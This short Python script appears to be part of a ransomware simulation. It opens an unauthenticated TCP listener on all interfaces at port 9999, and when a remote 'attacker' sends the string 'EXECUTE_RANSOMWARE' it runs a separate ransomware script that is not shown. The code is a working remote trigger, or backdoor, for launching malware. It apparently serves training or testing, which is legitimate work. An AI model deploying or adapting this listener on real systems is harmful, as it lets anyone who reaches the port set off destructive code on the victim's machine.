import socket
import subprocess

def start_listener(port=9999):
    print(f"\n  [Victim] Waiting for attacker signal on port {port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    conn, addr = s.accept()
    data = conn.recv(1024).decode()
    print(f"  [Victim] Signal received from {addr}: {data}")
    if data == "EXECUTE_RANSOMWARE":
        conn.sendall(b"RANSOMWARE_TRIGGERED")
        conn.close()
        subprocess.run(["python3", "/simulation/ransomware.py"])
    else:
        conn.sendall(b"UNKNOWN_COMMAND")
        conn.close()

if __name__ == "__main__":
    start_listener()
